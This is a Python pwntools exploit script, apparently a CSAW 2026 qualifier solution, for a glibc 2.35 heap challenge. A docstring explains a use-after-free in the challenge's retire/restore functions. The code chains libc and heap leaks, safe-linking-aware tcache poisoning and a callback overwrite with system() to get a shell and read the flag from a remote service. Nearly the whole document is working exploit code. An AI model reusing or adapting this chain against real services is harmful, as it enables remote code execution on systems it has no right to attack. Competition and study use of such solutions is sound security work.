#!/usr/bin/env python3
"""
Saint Vespers and the Copper Choir - CSAW 2026 Quals pwn.

glibc 2.35 (Ubuntu 22.04) with all mitigations on: PIE, Full RELRO, NX,
stack canaries, tcache safe-linking. Full source is bundled (vespers.c).

Vulnerability: `op_retire()` frees both the chorister struct and its
transcript buffer but never clears the slot pointer (`c->active = 0` is set
*after* both frees, and the slot pointer itself survives). `op_restore()`
flips `active` back to 1 without reallocating anything, so recite/rename/
inscribe/the Final Performance callback on a "restored" seat all operate on
freed memory -- a reusable use-after-free (and, by retiring twice, a
double-free).

Chain:
  1. libc leak: recruit a chorister with a >0x408-byte transcript so its
     free lands in the unsorted bin. retire+restore that seat, then recite
     it -- the UAF read prints the unsorted-bin fd, a main_arena pointer.
  2. heap leak: retire a small chorister and read its freed struct back
     through the roster/ledger (which also prints archived seats). Since
     `name` sits at struct offset 0, this is the tcache safe-linking value
     mangled(NULL) == chunk_addr >> 12 -- i.e. the heap base.
  3. tcache poison: `rename` writes straight into offset 0 of a freed
     struct (the chunk's fd). Overwrite it, safe-linking-mangled, to point
     the 0x60 tcache bin at a still-live chorister struct. A second,
     never-poisoned struct is parked in the same bin first so the tcache
     count stays non-zero through the poisoned pop.
  4. callback overwrite: recruit once more. The struct allocation reclaims
     the parked chunk; the transcript allocation (0x49 request -> same
     0x60 bin) lands on the live chorister's own memory. Write "/bin/sh\\0"
     over its name (offset 0) and &system over its sing pointer.
  5. fire: Final Performance calls sing(self) == system(self) ==
     system("/bin/sh") -> shell.

Usage:
    python3 solve_vespers.py HOST PORT     # remote/live service
    python3 solve_vespers.py --local       # bundled binary via pwntools process()
"""
import os
import sys
import time
from pwn import *

context.log_level = os.environ.get("LOGLEVEL", "info")

HERE = os.path.dirname(os.path.abspath(__file__))
EXE_PATH = os.path.join(HERE, "vespers")
LIBC_PATH = os.path.join(HERE, "libc.so.6")

exe = context.binary = ELF(EXE_PATH, checksec=False)
libc = ELF(LIBC_PATH, checksec=False)

# Structural offsets - fixed by the deterministic sequence of allocations
# below, for a fresh process against this shipped binary/libc.
L_OFFSET = 0x2a0          # &L (the first chorister struct) - heap_base
UNSORTED_DELTA = 0x21ace0  # unsorted-bin leak - libc_base (glibc 2.35, jammy)
SYSTEM_OFFSET = libc.symbols["system"]

NAME_SIZE = 0x38


def start():
    if len(sys.argv) >= 2 and sys.argv[1] == "--local":
        return process([exe.path], cwd=HERE)
    if len(sys.argv) >= 3:
        return remote(sys.argv[1], int(sys.argv[2]))
    print(__doc__)
    sys.exit(1)


io = start()


def menu(choice):
    io.sendlineafter(b"> ", str(choice).encode())


def recruit(name, style, length, data):
    menu(1)
    io.sendlineafter(b"Name this chorister: ", name)
    io.sendlineafter(b"Harmony): ", str(style).encode())
    io.sendlineafter(b"-4096): ", str(length).encode())
    io.sendafter(b"raw bytes): ", data)


def retire(idx):
    menu(2)
    io.sendlineafter(b"Retire which seat? ", str(idx).encode())


def restore(idx):
    menu(3)
    io.sendlineafter(b"Restore which seat? ", str(idx).encode())


def recite(idx):
    menu(5)
    io.sendlineafter(b"Recite which seat? ", str(idx).encode())
    io.recvuntil(b"bytes):\n")


def rename(idx, data):
    menu(6)
    io.sendlineafter(b"Rename which seat? ", str(idx).encode())
    io.sendafter(b"raw bytes): ", data)


def roster_read(idx, status=b"active"):
    menu(7)
    io.recvuntil(b"Seat %d [%s]: " % (idx, status))
    return io.recvn(NAME_SIZE)


# --- seat the choir -------------------------------------------------------
recruit(b"/bin/sh", 0, 0x10, b"L" * 0x10)      # idx0: eventual sing(self) target
recruit(b"spare", 0, 0x10, b"X" * 0x10)        # idx1: keeps the tcache bin non-empty
recruit(b"archive", 0, 0x500, b"B" * 0x500)    # idx2: big transcript for the libc leak
recruit(b"spacer", 0, 0x10, b"S" * 0x10)       # idx3: stops top-chunk consolidation

# --- retire the spare; leave it dangling forever --------------------------
retire(1)

# --- retire + restore the archive seat: our reusable UAF handle -----------
retire(2)
restore(2)

# --- libc leak: UAF-read the freed unsorted-bin chunk ----------------------
recite(2)
leak = u64(io.recvn(8))
io.recvn(8)
libc.address = leak - UNSORTED_DELTA
system_addr = libc.address + SYSTEM_OFFSET
log.success(f"libc base   = {hex(libc.address)}")
log.success(f"system()    = {hex(system_addr)}")

# --- heap leak: UAF-read the spare's own (freed) struct via the ledger ----
raw = roster_read(1, status=b"archived")
K = u64(raw[:8])                 # mangled(NULL) = spare_struct_addr >> 12
heap_base = K << 12
target_addr = heap_base + L_OFFSET
log.success(f"heap base   = {hex(heap_base)}")
log.success(f"target (&L) = {hex(target_addr)}")

# --- tcache poison: point the archive seat's freed struct at &L -----------
mangled = (target_addr ^ K) & 0xffffffffffffffff
rename(2, p64(mangled) + b"\x00" * (NAME_SIZE - 1 - 8))

# --- pop the poisoned chunk and overwrite L in place -----------------------
payload = b"/bin/sh\x00" + b"\x00" * (NAME_SIZE - 8) + p64(system_addr) + b"\x00" * 9
assert len(payload) == 0x49
recruit(b"C", 0, 0x49, payload)

# --- Final Performance: L->sing(L) == system(L) == system("/bin/sh") ------
menu(8)

io.sendline(b"cat flag.txt")
time.sleep(0.5)
out = io.recvrepeat(2).decode(errors="replace")
print(out)
if "csaw{" in out:
    flag = "csaw{" + out.split("csaw{", 1)[1].split("}", 1)[0] + "}"
    log.success(f"FLAG: {flag}")
io.close()
